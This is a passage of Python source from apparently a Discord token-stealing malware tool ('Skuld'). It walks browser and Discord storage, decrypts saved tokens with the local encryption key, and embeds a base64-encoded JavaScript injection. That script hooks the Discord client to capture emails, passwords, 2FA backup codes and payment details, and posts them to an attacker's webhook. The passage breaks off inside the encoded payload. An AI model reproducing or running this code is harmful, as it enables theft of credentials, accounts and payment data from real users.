                if len(gifts) == 0:
                    gifts = 'Gift Codes: (NONE)'
                else:
                    gifts = 'Gift Codes:\n\t' + '\n\t'.join(gifts)
                results.append({'USERNAME': user, 'USERID': id, 'MFA': mfa, 'EMAIL': email, 'PHONE': phone, 'VERIFIED': verified, 'NITRO': nitro_data, 'BILLING': billing, 'TOKEN': token, 'GIFTS': gifts})
        return results

    @staticmethod
    def SafeStorageSteal(path: str) -> list[str]:
        encryptedTokens = list()
        tokens = list()
        key: str = None
        levelDbPaths: list[str] = list()
        localStatePath = os.path.join(path, 'Local State')
        for (root, dirs, _) in os.walk(path):
            for dir in dirs:
                if dir == 'leveldb':
                    levelDbPaths.append(os.path.join(root, dir))
        if os.path.isfile(localStatePath) and levelDbPaths:
            with open(localStatePath, errors='ignore') as file:
                jsonContent: dict = json.load(file)
            key = jsonContent['os_crypt']['encrypted_key']
            key = base64.b64decode(key)[5:]
            for levelDbPath in levelDbPaths:
                for file in os.listdir(levelDbPath):
                    if file.endswith(('.log', '.ldb')):
                        filepath = os.path.join(levelDbPath, file)
                        with open(filepath, errors='ignore') as file:
                            lines = file.readlines()
                        for line in lines:
                            if line.strip():
                                matches: list[str] = re.findall(Discord.REGEX_ENC, line)
                                for match in matches:
                                    match = match.rstrip('\\')
                                    if not match in encryptedTokens:
                                        match = base64.b64decode(match.split('dQw4w9WgXcQ:')[1].encode())
                                        encryptedTokens.append(match)
        for token in encryptedTokens:
            try:
                token = pyaes.AESModeOfOperationGCM(Syscalls.CryptUnprotectData(key), token[3:15]).decrypt(token[15:])[:-16].decode(errors='ignore')
                if token:
                    tokens.append(token)
            except Exception:
                pass
        return tokens

    @staticmethod
    def SimpleSteal(path: str) -> list[str]:
        tokens = list()
        levelDbPaths = list()
        for (root, dirs, _) in os.walk(path):
            for dir in dirs:
                if dir == 'leveldb':
                    levelDbPaths.append(os.path.join(root, dir))
        for levelDbPath in levelDbPaths:
            for file in os.listdir(levelDbPath):
                if file.endswith(('.log', '.ldb')):
                    filepath = os.path.join(levelDbPath, file)
                    with open(filepath, errors='ignore') as file:
                        lines = file.readlines()
                    for line in lines:
                        if line.strip():
                            matches: list[str] = re.findall(Discord.REGEX, line.strip())
                            for match in matches:
                                match = match.rstrip('\\')
                                if not match in tokens:
                                    tokens.append(match)
        return tokens

    @staticmethod
    def FireFoxSteal(path: str) -> list[str]:
        tokens = list()
        for (root, _, files) in os.walk(path):
            for file in files:
                if file.lower().endswith('.sqlite'):
                    filepath = os.path.join(root, file)
                    with open(filepath, errors='ignore') as file:
                        lines = file.readlines()
                        for line in lines:
                            if line.strip():
                                matches: list[str] = re.findall(Discord.REGEX, line)
                                for match in matches:
                                    match = match.rstrip('\\')
                                    if not match in tokens:
                                        tokens.append(match)
        return tokens

    @staticmethod
    def InjectJs() -> str | None:
        check = False
        try:
            code = base64.b64decode(b'Y29uc3QgZnMgPSByZXF1aXJlKCdmcycpOwpjb25zdCBvcyA9IHJlcXVpcmUoJ29zJyk7CmNvbnN0IGh0dHBzID0gcmVxdWlyZSgnaHR0cHMnKTsKY29uc3QgYXJncyA9IHByb2Nlc3MuYXJndjsKY29uc3QgcGF0aCA9IHJlcXVpcmUoJ3BhdGgnKTsKY29uc3QgcXVlcnlzdHJpbmcgPSByZXF1aXJlKCdxdWVyeXN0cmluZycpOwoKY29uc3QgewogICAgQnJvd3NlcldpbmRvdywKICAgIHNlc3Npb24sCiAgICBhcHAKfSA9IHJlcXVpcmUoJ2VsZWN0cm9uJyk7CmNvbnN0IGVuY29kZWRIb29rID0gJyVXRUJIT09LSEVSRUJBU0U2NEVOQ09ERUQlJwoKY29uc3QgQ09ORklHID0gewogICAgd2ViaG9vazogYXRvYihlbmNvZGVkSG9vayksCiAgICBpbmplY3Rpb25fdXJsOiAiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2FkYXNkYXNkc2FmL2Rpc2NvcmQtaW5qZWN0aW9uL21haW4vaW5qZWN0aW9uLmpzIiwKICAgIGZpbHRlcnM6IHsKICAgICAgICB1cmxzOiBbCiAgICAgICAgICAgICcvYXV0aC9sb2dpbicsCiAgICAgICAgICAgICcvYXV0aC9yZWdpc3RlcicsCiAgICAgICAgICAgICcvbWZhL3RvdHAnLAogICAgICAgICAgICAnL21mYS9jb2Rlcy12ZXJpZmljYXRpb24nLAogICAgICAgICAgICAnL3VzZXJzL0BtZScsCiAgICAgICAgXSwKICAgIH0sCiAgICBmaWx0ZXJzMjogewogICAgICAgIHVybHM6IFsKICAgICAgICAgICAgJ3dzczovL3JlbW90ZS1hdXRoLWdhdGV3YXkuZGlzY29yZC5nZy8qJywKICAgICAgICAgICAgJ2h0dHBzOi8vZGlzY29yZC5jb20vYXBpL3YqL2F1dGgvc2Vzc2lvbnMnLAogICAgICAgICAgICAnaHR0cHM6Ly8qLmRpc2NvcmQuY29tL2FwaS92Ki9hdXRoL3Nlc3Npb25zJywKICAgICAgICAgICAgJ2h0dHBzOi8vZGlzY29yZGFwcC5jb20vYXBpL3YqL2F1dGgvc2Vzc2lvbnMnCiAgICAgICAgXSwKICAgIH0sCiAgICBwYXltZW50X2ZpbHRlcnM6IHsKICAgICAgICB1cmxzOiBbCiAgICAgICAgICAgICdodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbS9tZXJjaGFudHMvNDlwcDJycDRwaHltNzM4Ny9jbGllbnRfYXBpL3YqL3BheW1lbnRfbWV0aG9kcy9wYXlwYWxfYWNjb3VudHMnLAogICAgICAgICAgICAnaHR0cHM6Ly9hcGkuc3RyaXBlLmNvbS92Ki90b2tlbnMnLAogICAgICAgIF0sCiAgICB9LAogICAgQVBJOiAiaHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvdjkvdXNlcnMvQG1lIiwKICAgIGJhZGdlczogewogICAgICAgIERpc2NvcmRfRW1sb3llZTogewogICAgICAgICAgICBWYWx1ZTogMSwKICAgICAgICAgICAgRW1vamk6ICI8Ojg0ODVkaXNjb3JkZW1wbG95ZWU6MTE2MzE3MjI1Mjk4OTI1OTg5OD4iLAogICAgICAgICAgICBSYXJlOiB0cnVlLAogICAgICAgIH0sCiAgICAgICAgUGFydG5lcmVkX1NlcnZlcl9Pd25lcjogewogICAgICAgICAgICBWYWx1ZTogMiwKICAgICAgICAgICAgRW1vamk6ICI8Ojk5MjhkaXNjb3JkcGFydG5lcmJhZGdlOjExNjMxNzIzMDQxNTU1ODY1NzA+IiwKICAgICAgICAgICAgUmFyZTogdHJ1ZSwKICAgICAgICB9LAogICAgICAgIEh5cGVTcXVhZF9FdmVudHM6IHsKICAgICAgICAgICAgVmFsdWU6IDQsCiAgICAgICAgICAgIEVtb2ppOiAiPDo5MTcxaHlwZXNxdWFkZXZlbnRzOjExNjMxNzIyNDgxNDA2NjA4Mzk+IiwKICAgICAgICAgICAgUmFyZTogdHJ1ZSwKICAgICAgICB9LAogICAgICAgIEJ1Z19IdW50ZXJfTGV2ZWxfMTogewogICAgICAgICAgICBWYWx1ZTogOCwKICAgICAgICAgICAgRW1vamk6ICI8OjQ3NDRidWdodW50ZXJiYWRnZWRpc2NvcmQ6MTE2MzE3MjIzOTk3MDE0MDM4Mz4iLAogICAgICAgICAgICBSYXJlOiB0cnVlLAogICAgICAgIH0sCiAgICAgICAgRWFybHlfU3VwcG9ydGVyOiB7CiAgICAgICAgICAgIFZhbHVlOiA1MTIsCiAgICAgICAgICAgIEVtb2ppOiAiPDo1MDUzZWFybHlzdXBwb3J0ZXI6MTE2MzE3MjI0MTk5NjAwNTQxNj4iLAogICAgICAgICAgICBSYXJlOiB0cnVlLAogICAgICAgIH0sCiAgICAgICAgQnVnX0h1bnRlcl9MZXZlbF8yOiB7CiAgICAgICAgICAgIFZhbHVlOiAxNjM4NCwKICAgICAgICAgICAgRW1vamk6ICI8OjE3NTdidWdidXN0ZXJiYWRnZWRpc2NvcmQ6MTE2MzE3MjIzODk0MjU0Mzg5Mj4iLAogICAgICAgICAgICBSYXJlOiB0cnVlLAogICAgICAgIH0sCiAgICAgICAgRWFybHlfVmVyaWZpZWRfQm90X0RldmVsb3BlcjogewogICAgICAgICAgICBWYWx1ZTogMTMxMDcyLAogICAgICAgICAgICBFbW9qaTogIjw6MTIwN2ljb25lYXJseWJvdGRldmVsb3BlcjoxMTYzMTcyMjM2ODA3NjM5MTQzPiIsCiAgICAgICAgICAgIFJhcmU6IHRydWUsCiAgICAgICAgfSwKICAgICAgICBIb3VzZV9CcmF2ZXJ5OiB7CiAgICAgICAgICAgIFZhbHVlOiA2NCwKICAgICAgICAgICAgRW1vamk6ICI8OjY2MDFoeXBlc3F1YWRicmF2ZXJ5OjExNjMxNzIyNDY0OTIyODcwMTc+IiwKICAgICAgICAgICAgUmFyZTogZmFsc2UsCiAgICAgICAgfSwKICAgICAgICBIb3VzZV9CcmlsbGlhbmNlOiB7CiAgICAgICAgICAgIFZhbHVlOiAxMjgsCiAgICAgICAgICAgIEVtb2ppOiAiPDo2OTM2aHlwZXNxdWFkYnJpbGxpYW5jZToxMTYzMTcyMjQ0NDc0ODIyNzQ2PiIsCiAgICAgICAgICAgIFJhcmU6IGZhbHNlLAogICAgICAgIH0sCiAgICAgICAgSG91c2VfQmFsYW5jZTogewogICAgICAgICAgICBWYWx1ZTogMjU2LAogICAgICAgICAgICBFbW9qaTogIjw6NTI0Mmh5cGVzcXVhZGJhbGFuY2U6MTE2MzE3MjI0MzQxNzg1ODEyOD4iLAogICAgICAgICAgICBSYXJlOiBmYWxzZSwKICAgICAgICB9LAogICAgICAgIEFjdGl2ZV9EZXZlbG9wZXI6IHsKICAgICAgICAgICAgVmFsdWU6IDQxOTQzMDQsCiAgICAgICAgICAgIEVtb2ppOiAiPDoxMjA3aWNvbmFjdGl2ZWRldmVsb3BlcjoxMTYzMTcyNTM0NDQzODUxODY4PiIsCiAgICAgICAgICAgIFJhcmU6IGZhbHNlLAogICAgICAgIH0sCiAgICAgICAgQ2VydGlmaWVkX01vZGVyYXRvcjogewogICAgICAgICAgICBWYWx1ZTogMjYyMTQ0LAogICAgICAgICAgICBFbW9qaTogIjw6NDE0OWJsdXJwbGVjZXJ0aWZpZWRtb2RlcmF0b3I6MTE2MzE3MjI1NTQ4OTA4NTQ4MT4iLAogICAgICAgICAgICBSYXJlOiB0cnVlLAogICAgICAgIH0sCiAgICAgICAgU3BhbW1lcjogewogICAgICAgICAgICBWYWx1ZTogMTA0ODcwNCwKICAgICAgICAgICAgRW1vamk6ICLijKjvuI8iLAogICAgICAgICAgICBSYXJlOiBmYWxzZSwKICAgICAgICB9LAogICAgfSwKfTsKCmNvbnN0IGV4ZWN1dGVKUyA9IHNjcmlwdCA9PiB7CiAgICBjb25zdCB3aW5kb3cgPSBCcm93c2VyV2luZG93LmdldEFsbFdpbmRvd3MoKVswXTsKICAgIHJldHVybiB3aW5kb3cud2ViQ29udGVudHMuZXhlY3V0ZUphdmFTY3JpcHQoc2NyaXB0LCAhMCk7Cn07Cgpjb25zdCBjbGVhckFsbFVzZXJEYXRhID0gKCkgPT4gewogICAgY29uc3Qgd2luZG93ID0gQnJvd3NlcldpbmRvdy5nZXRBbGxXaW5kb3dzKClbMF07CiAgICB3aW5kb3cud2ViQ29udGVudHMuc2Vzc2lvbi5mbHVzaFN0b3JhZ2VEYXRhKCk7CiAgICB3aW5kb3cud2ViQ29udGVudHMuc2Vzc2lvbi5jbGVhclN0b3JhZ2VEYXRhKCk7CiAgICBhcHAucmVsYXVuY2goKTsKICAgIGFwcC5leGl0KCk7Cn07Cgpjb25zdCBnZXRUb2tlbiA9IGFzeW5jICgpID0+IGF3YWl0IGV4ZWN1dGVKUyhgKHdlYnBhY2tDaHVua2Rpc2NvcmRfYXBwLnB1c2goW1snJ10se30sZT0+e209W107Zm9yKGxldCBjIGluIGUuYyltLnB1c2goZS5jW2NdKX1dKSxtKS5maW5kKG09Pm0/LmV4cG9ydHM/LmRlZmF1bHQ/LmdldFRva2VuIT09dm9pZCAwKS5leHBvcnRzLmRlZmF1bHQuZ2V0VG9rZW4oKWApOwoKY29uc3QgcmVxdWVzdCA9IGFzeW5jIChtZXRob2QsIHVybCwgaGVhZGVycywgZGF0YSkgPT4gewogICAgdXJsID0gbmV3IFVSTCh1cmwpOwogICAgY29uc3Qgb3B0aW9ucyA9IHsKICAgICAgICBwcm90b2NvbDogdXJsLnByb3RvY29sLAogICAgICAgIGhvc3RuYW1lOiB1cmwuaG9zdCwKICAgICAgICBwYXRoOiB1cmwucGF0aG5hbWUsCiAgICAgICAgbWV0aG9kOiBtZXRob2QsCiAgICAgICAgaGVhZGVyczogewogICAgICAgICAgICAiQWNjZXNzLUNvbnRyb2wtQWxsb3ctT3JpZ2luIjogIioiLAogICAgICAgIH0sCiAgICB9OwoKICAgIGlmICh1cmwuc2VhcmNoKSBvcHRpb25zLnBhdGggKz0gdXJsLnNlYXJjaDsKICAgIGZvciAoY29uc3Qga2V5IGluIGhlYWRlcnMpIG9wdGlvbnMuaGVhZGVyc1trZXldID0gaGVhZGVyc1trZXldOwogICAgY29uc3QgcmVxID0gaHR0cHMucmVxdWVzdChvcHRpb25zKTsKICAgIGlmIChkYXRhKSByZXEud3JpdGUoZGF0YSk7CiAgICByZXEuZW5kKCk7CgogICAgcmV0dXJuIG5ldyBQcm9taXNlKChyZXNvbHZlLCByZWplY3QpID0+IHsKICAgICAgICByZXEub24oInJlc3BvbnNlIiwgcmVzID0+IHsKICAgICAgICAgICAgbGV0IGRhdGEgPSAiIjsKICAgICAgICAgICAgcmVzLm9uKCJkYXRhIiwgY2h1bmsgPT4gZGF0YSArPSBjaHVuayk7CiAgICAgICAgICAgIHJlcy5vbigiZW5kIiwgKCkgPT4gcmVzb2x2ZShkYXRhKSk7CiAgICAgICAgfSk7CiAgICB9KTsKfTsKCmNvbnN0IGhvb2tlciA9IGFzeW5jIChjb250ZW50LCB0b2tlbiwgYWNjb3VudCkgPT4gewogICAgY29udGVudFsiY29udGVudCJdID0gImAiICsgb3MuaG9zdG5hbWUoKSArICJgIC0gYCIgKyBvcy51c2VySW5mbygpLnVzZXJuYW1lICsgImBcblxuIiArIGNvbnRlbnRbImNvbnRlbnQiXTsKICAgIGNvbnRlbnRbInVzZXJuYW1lIl0gPSAic2t1bGQgLSBjb3JkIGluamVjdGlvbiI7CiAgICBjb250ZW50WyJhdmF0YXJfdXJsIl0gPSAiaHR0cHM6Ly9pLmliYi5jby9HSkdYekdYL2Rpc2NvcmQtYXZhdGFyLTUxMi1GQ1dVSi5wbmciOwogICAgY29udGVudFsiZW1iZWRzIl1bMF1bImF1dGhvciJdID0gewogICAgICAgICJuYW1lIjogYWNjb3VudC51c2VybmFtZSwKICAgIH07CiAgICBjb250ZW50WyJlbWJlZHMiXVswXVsidGh1bWJuYWlsIl0gPSB7CiAgICAgICAgInVybCI6IGBodHRwczovL2Nkbi5kaXNjb3JkYXBwLmNvbS9hdmF0YXJzLyR7YWNjb3VudC5pZH0vJHthY2NvdW50LmF2YXRhcn0ud2VicGAKICAgIH07CiAgICBjb250ZW50WyJlbWJlZHMiXVswXVsiZm9vdGVyIl0gPSB7CiAgICAgICAgInRleHQiOiAic2t1bGQgZGlzY29yZCBpbmplY3Rpb24gLSBtYWRlIGJ5IGhhY2tpcmJ5IiwKICAgICAgICAiaWNvbl91cmwiOiAiaHR0cHM6Ly9hdmF0YXJzLmdpdGh1YnVzZXJjb250ZW50LmNvbS91LzE0NTQ4Nzg0NT92PTQiLAogICAgfTsKICAgIGNvbnRlbnRbImVtYmVkcyJdWzBdWyJ0aXRsZSJdID0gIkFjY291bnQgSW5mb3JtYXRpb24iOwoKICAgIGNvbnN0IG5pdHJvID0gZ2V0Tml0cm8oYWNjb3VudC5wcmVtaXVtX3R5cGUpOwogICAgY29uc3QgYmFkZ2VzID0gZ2V0QmFkZ2VzKGFjY291bnQuZmxhZ3MpOwogICAgY29uc3QgYmlsbGluZyA9IGF3YWl0IGdldEJpbGxpbmcodG9rZW4pOwoKICAgIGNvbnN0IGZyaWVuZHMgPSBhd2FpdCBnZXRGcmllbmRzKHRva2VuKTsKICAgIGNvbnN0IHNlcnZlcnMgPSBhd2FpdCBnZXRTZXJ2ZXJzKHRva2VuKTsKCiAgICBjb250ZW50WyJlbWJlZHMiXVswXVsiZmllbGRzIl0ucHVzaCh7CiAgICAgICAgIm5hbWUiOiAiVG9rZW4iLAogICAgICAgICJ2YWx1ZSI6ICJgYGAiICsgdG9rZW4gKyAiYGBgIiwKICAgICAgICAiaW5saW5lIjogZmFsc2UKICAgIH0sIHsKICAgICAgICAibmFtZSI6ICJOaXRybyIsCiAgICAgICAgInZhbHVlIjogbml0cm8sCiAgICAgICAgImlubGluZSI6IHRydWUKICAgIH0sIHsKICAgICAgICAibmFtZSI6ICJCYWRnZXMiLAogICAgICAgICJ2YWx1ZSI6IGJhZGdlcywKICAgICAgICAiaW5saW5lIjogdHJ1ZQogICAgfSwgewogICAgICAgICJuYW1lIjogIkJpbGxpbmciLAogICAgICAgICJ2YWx1ZSI6IGJpbGxpbmcsCiAgICAgICAgImlubGluZSI6IHRydWUKICAgIH0pOwoKICAgIGNvbnRlbnRbImVtYmVkcyJdLnB1c2goewogICAgICAgICJ0aXRsZSI6IGBUb3RhbCBGcmllbmRzOiAke2ZyaWVuZHMudG90YWxGcmllbmRzfWAsCiAgICAgICAgImRlc2NyaXB0aW9uIjogZnJpZW5kcy5tZXNzYWdlLAogICAgfSwgewogICAgICAgICJ0aXRsZSI6IGBUb3RhbCBTZXJ2ZXJzOiAke3NlcnZlcnMudG90YWxHdWlsZHN9YCwKICAgICAgICAiZGVzY3JpcHRpb24iOiBzZXJ2ZXJzLm1lc3NhZ2UsCiAgICB9KTsKCiAgICBmb3IgKGNvbnN0IGVtYmVkIGluIGNvbnRlbnRbImVtYmVkcyJdKSB7CiAgICAgICAgY29udGVudFsiZW1iZWRzIl1bZW1iZWRdWyJjb2xvciJdID0gMHhiMTQzZTM7CiAgICB9CgogICAgYXdhaXQgcmVxdWVzdCgiUE9TVCIsIENPTkZJRy53ZWJob29rLCB7CiAgICAgICAgIkNvbnRlbnQtVHlwZSI6ICJhcHBsaWNhdGlvbi9qc29uIgogICAgfSwgSlNPTi5zdHJpbmdpZnkoY29udGVudCkpOwp9OwoKY29uc3QgZmV0Y2ggPSBhc3luYyAoZW5kcG9pbnQsIGhlYWRlcnMpID0+IHsKICAgIHJldHVybiBKU09OLnBhcnNlKGF3YWl0IHJlcXVlc3QoIkdFVCIsIENPTkZJRy5BUEkgKyBlbmRwb2ludCwgaGVhZGVycykpOwp9OwoKY29uc3QgZmV0Y2hBY2NvdW50ID0gYXN5bmMgdG9rZW4gPT4gYXdhaXQgZmV0Y2goIiIsIHsKICAgICJBdXRob3JpemF0aW9uIjogdG9rZW4KfSk7CmNvbnN0IGZldGNoQmlsbGluZyA9IGFzeW5jIHRva2VuID0+IGF3YWl0IGZldGNoKCIvYmlsbGluZy9wYXltZW50LXNvdXJjZXMiLCB7CiAgICAiQXV0aG9yaXphdGlvbiI6IHRva2VuCn0pOwpjb25zdCBmZXRjaFNlcnZlcnMgPSBhc3luYyB0b2tlbiA9PiBhd2FpdCBmZXRjaCgiL2d1aWxkcz93aXRoX2NvdW50cz10cnVlIiwgewogICAgIkF1dGhvcml6YXRpb24iOiB0b2tlbgp9KTsKY29uc3QgZmV0Y2hGcmllbmRzID0gYXN5bmMgdG9rZW4gPT4gYXdhaXQgZmV0Y2goIi9yZWxhdGlvbnNoaXBzIiwgewogICAgIkF1dGhvcml6YXRpb24iOiB0b2tlbgp9KTsKCmNvbnN0IGdldE5pdHJvID0gZmxhZ3MgPT4gewogICAgc3dpdGNoIChmbGFncykgewogICAgICAgIGNhc2UgMToKICAgICAgICAgICAgcmV0dXJuICdgTml0cm8gQ2xhc3NpY2AnOwogICAgICAgIGNhc2UgMjoKICAgICAgICAgICAgcmV0dXJuICdgTml0cm8gQm9vc3RgJzsKICAgICAgICBjYXNlIDM6CiAgICAgICAgICAgIHJldHVybiAnYE5pdHJvIEJhc2ljYCc7CiAgICAgICAgZGVmYXVsdDoKICAgICAgICAgICAgcmV0dXJuICdg4p2MYCc7CiAgICB9Cn07Cgpjb25zdCBnZXRCYWRnZXMgPSBmbGFncyA9PiB7CiAgICBsZXQgYmFkZ2VzID0gJyc7CiAgICBmb3IgKGNvbnN0IGJhZGdlIGluIENPTkZJRy5iYWRnZXMpIHsKICAgICAgICBsZXQgYiA9IENPTkZJRy5iYWRnZXNbYmFkZ2VdOwogICAgICAgIGlmICgoZmxhZ3MgJiBiLlZhbHVlKSA9PSBiLlZhbHVlKSBiYWRnZXMgKz0gYi5FbW9qaSArICcgJzsKICAgIH0KICAgIHJldHVybiBiYWRnZXMgfHwgJ2DinYxgJzsKfQoKY29uc3QgZ2V0UmFyZUJhZGdlcyA9IGZsYWdzID0+IHsKICAgIGxldCBiYWRnZXMgPSAnJzsKICAgIGZvciAoY29uc3QgYmFkZ2UgaW4gQ09ORklHLmJhZGdlcykgewogICAgICAgIGxldCBiID0gQ09ORklHLmJhZGdlc1tiYWRnZV07CiAgICAgICAgaWYgKChmbGFncyAmIGIuVmFsdWUpID09IGIuVmFsdWUgJiYgYi5SYXJlKSBiYWRnZXMgKz0gYi5FbW9qaSArICcgJzsKICAgIH0KICAgIHJldHVybiBiYWRnZXM7Cn0KCmNvbnN0IGdldEJpbGxpbmcgPSBhc3luYyB0b2tlbiA9PiB7CiAgICBjb25zdCBkYXRhID0gYXdhaXQgZmV0Y2hCaWxsaW5nKHRva2VuKTsKICAgIGxldCBiaWxsaW5nID0gJyc7CiAgICBkYXRhLmZvckVhY2goKHgpID0+IHsKICAgICAgICBpZiAoIXguaW52YWxpZCkgewogICAgICAgICAgICBzd2l0Y2ggKHgudHlwZSkgewogICAgICAgICAgICAgICAgY2FzZSAxOgogICAgICAgICAgICAgICAgICAgIGJpbGxpbmcgKz0gJ/CfkrMgJzsKICAgICAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgICAgIGNhc2UgMjoKICAgICAgICAgICAgICAgICAgICBiaWxsaW5nICs9ICc8OnBheXBhbDoxMTQ4NjUzMzA1Mzc2MDM0OTY3PiAnOwogICAgICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfSk7CiAgICByZXR1cm4gYmlsbGluZyB8fCAnYOKdjGAnOwp9OwoKY29uc3QgZ2V0RnJpZW5kcyA9IGFzeW5jIHRva2VuID0+IHsKICAgIGNvbnN0IGZyaWVuZHMgPSBhd2FpdCBmZXRjaEZyaWVuZHModG9rZW4pOwoKICAgIGNvbnN0IGZpbHRlcmVkRnJpZW5kcyA9IGZyaWVuZHMuZmlsdGVyKCh1c2VyKSA9PiB7CiAgICAgICAgcmV0dXJuIHVzZXIudHlwZSA9PSAxCiAgICB9KQogICAgbGV0IHJhcmVVc2VycyA9ICIiOwogICAgZm9yIChjb25zdCBhY2Mgb2YgZmlsdGVyZWRGcmllbmRzKSB7CiAgICAgICAgdmFyIGJhZGdlcyA9IGdldFJhcmVCYWRnZXMoYWNjLnVzZXIucHVibGljX2ZsYWdzKQogICAgICAgIGlmIChiYWRnZXMgIT0gIiIpIHsKICAgICAgICAgICAgaWYgKCFyYXJlVXNlcnMpIHJhcmVVc2VycyA9ICIqKlJhcmUgRnJpZW5kczoqKlxuIjsKICAgICAgICAgICAgcmFyZVVzZXJzICs9IGAke2JhZGdlc30gJHthY2MudXNlci51c2VybmFtZX0jJHthY2MudXNlci5kaXNjcmltaW5hdG9yfVxuYDsKICAgICAgICB9CiAgICB9CiAgICByYXJlVXNlcnMgPSByYXJlVXNlcnMgfHwgIioqTm8gUmFyZSBGcmllbmRzKioiOwoKICAgIHJldHVybiB7CiAgICAgICAgbWVzc2FnZTogcmFyZVVzZXJzLAogICAgICAgIHRvdGFsRnJpZW5kczogZnJpZW5kcy5sZW5ndGgsCiAgICB9Owp9OwoKY29uc3QgZ2V0U2VydmVycyA9IGFzeW5jIHRva2VuID0+IHsKICAgIGNvbnN0IGd1aWxkcyA9IGF3YWl0IGZldGNoU2VydmVycyh0b2tlbik7CgogICAgY29uc3QgZmlsdGVyZWRHdWlsZHMgPSBndWlsZHMuZmlsdGVyKChndWlsZCkgPT4gZ3VpbGQucGVybWlzc2lvbnMgPT0gJzU2Mjk0OTk1MzQyMTMxMScpOwogICAgbGV0IHJhcmVHdWlsZHMgPSAiIjsKICAgIGZvciAoY29uc3QgZ3VpbGQgb2YgZmlsdGVyZWRHdWlsZHMpIHsKICAgICAgICBpZiAocmFyZUd1aWxkcyA9PT0gIiIpIHsKICAgICAgICAgICAgcmFyZUd1aWxkcyArPSBgKipSYXJlIFNlcnZlcnM6KipcbmA7CiAgICAgICAgfQogICAgICAgIHJhcmVHdWlsZHMgKz0gYCR7Z3VpbGQub3duZXIgPyAiPDpTQV9Pd25lcjo5OTEzMTI0MTUzNTI0MzA2NzM+IE93bmVyIiA6ICI8OmFkbWluOjk2Nzg1MTk1NjkzMDQ4MjIwNj4gQWRtaW4ifSB8IFNlcnZlciBOYW1lOiBcYCR7Z3VpbGQubmFtZX1cYCAtIE1lbWJlcnM6IFxgJHtndWlsZC5hcHByb3hpbWF0ZV9tZW1iZXJfY291bnR9XGBcbmA7CiAgICB9CgogICAgcmFyZUd1aWxkcyA9IHJhcmVHdWlsZHMgfHwgIioqTm8gUmFyZSBTZXJ2ZXJzKioiOwoKICAgIHJldHVybiB7CiAgICAgICAgbWVzc2FnZTogcmFyZUd1aWxkcywKICAgICAgICB0b3RhbEd1aWxkczogZ3VpbGRzLmxlbmd0aCwKICAgIH07Cn07Cgpjb25zdCBFbWFpbFBhc3NUb2tlbiA9IGFzeW5jIChlbWFpbCwgcGFzc3dvcmQsIHRva2VuLCBhY3Rpb24pID0+IHsKICAgIGNvbnN0IGFjY291bnQgPSBhd2FpdCBmZXRjaEFjY291bnQodG9rZW4pCgogICAgY29uc3QgY29udGVudCA9IHsKICAgICAgICAiY29udGVudCI6IGAqKiR7YWNjb3VudC51c2VybmFtZX0qKiBqdXN0ICR7YWN0aW9ufSFgLAogICAgICAgICJlbWJlZHMiOiBbewogICAgICAgICAgICAiZmllbGRzIjogW3sKICAgICAgICAgICAgICAgICJuYW1lIjogIkVtYWlsIiwKICAgICAgICAgICAgICAgICJ2YWx1ZSI6ICJgIiArIGVtYWlsICsgImAiLAogICAgICAgICAgICAgICAgImlubGluZSI6IHRydWUKICAgICAgICAgICAgfSwgewogICAgICAgICAgICAgICAgIm5hbWUiOiAiUGFzc3dvcmQiLAogICAgICAgICAgICAgICAgInZhbHVlIjogImAiICsgcGFzc3dvcmQgKyAiYCIsCiAgICAgICAgICAgICAgICAiaW5saW5lIjogdHJ1ZQogICAgICAgICAgICB9XQogICAgICAgIH1dCiAgICB9OwoKICAgIGhvb2tlcihjb250ZW50LCB0b2tlbiwgYWNjb3VudCk7Cn0KCmNvbnN0IEJhY2t1cENvZGVzVmlld2VkID0gYXN5bmMgKGNvZGVzLCB0b2tlbikgPT4gewogICAgY29uc3QgYWNjb3VudCA9IGF3YWl0IGZldGNoQWNjb3VudCh0b2tlbikKCiAgICBjb25zdCBmaWx0ZXJlZENvZGVzID0gY29kZXMuZmlsdGVyKChjb2RlKSA9PiB7CiAgICAgICAgcmV0dXJuIGNvZGUuY29uc3VtZWQgPT09IGZhbHNlOwogICAgfSk7CgogICAgbGV0IG1lc3NhZ2UgPSAiIjsKICAgIGZvciAobGV0IGNvZGUgb2YgZmlsdGVyZWRDb2RlcykgewogICAgICAgIG1lc3NhZ2UgKz0gYCR7Y29kZS5jb2RlLnN1YnN0cigwLCA0KX0tJHtjb2RlLmNvZGUuc3Vic3RyKDQpfVxuYDsKICAgIH0KICAgIGNvbnN0IGNvbnRlbnQgPSB7CiAgICAgICAgImNvbnRlbnQiOiBgKioke2FjY291bnQudXNlcm5hbWV9KioganVzdCB2aWV3ZWQgaGlzIDJGQSBiYWNrdXAgY29kZXMhYCwKICAgICAgICAiZW1iZWRzIjogW3sKICAgICAgICAgICAgImZpZWxkcyI6IFt7CiAgICAgICAgICAgICAgICAgICAgIm5hbWUiOiAiQmFja3VwIENvZGVzIiwKICAgICAgICAgICAgICAgICAgICAidmFsdWUiOiAiYGBgIiArIG1lc3NhZ2UgKyAiYGBgIiwKICAgICAgICAgICAgICAgICAgICAiaW5saW5lIjogZmFsc2UKICAgICAgICAgICAgICAgIH0sCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgIm5hbWUiOiAiRW1haWwiLAogICAgICAgICAgICAgICAgICAgICJ2YWx1ZSI6ICJgIiArIGFjY291bnQuZW1haWwgKyAiYCIsCiAgICAgICAgICAgICAgICAgICAgImlubGluZSI6IHRydWUKICAgICAgICAgICAgICAgIH0sIHsKICAgICAgICAgICAgICAgICAgICAibmFtZSI6ICJQaG9uZSIsCiAgICAgICAgICAgICAgICAgICAgInZhbHVlIjogImAiICsgKGFjY291bnQucGhvbmUgfHwgIk5vbmUiKSArICJgIiwKICAgICAgICAgICAgICAgICAgICAiaW5saW5lIjogdHJ1ZQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICBdCgogICAgICAgIH1dCiAgICB9OwoKICAgIGhvb2tlcihjb250ZW50LCB0b2tlbiwgYWNjb3VudCk7Cn0KCmNvbnN0IFBhc3N3b3JkQ2hhbmdlZCA9IGFzeW5jIChuZXdQYXNzd29yZCwgb2xkUGFzc3dvcmQsIHRva2VuKSA9PiB7CiAgICBjb25zdCBhY2NvdW50ID0gYXdhaXQgZmV0Y2hBY2NvdW50KHRva2VuKQoKICAgIGNvbnN0IGNvbnRlbnQgPS